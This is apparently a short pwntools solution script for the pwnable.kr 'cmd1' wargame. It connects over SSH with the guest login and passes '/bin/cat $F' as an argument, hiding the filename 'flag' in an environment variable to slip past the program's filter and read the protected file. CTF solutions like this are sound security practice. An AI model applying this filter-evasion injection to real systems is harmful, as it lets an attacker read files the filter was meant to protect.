from pwn import *

session = ssh('cmd1', 'pwnable.kr', port=2222, password='guest')

# Not sure if this is the intended solution.
io = session.process(['./cmd1', '/bin/cat $F'], env={'F':'flag'})
print(io.readline())
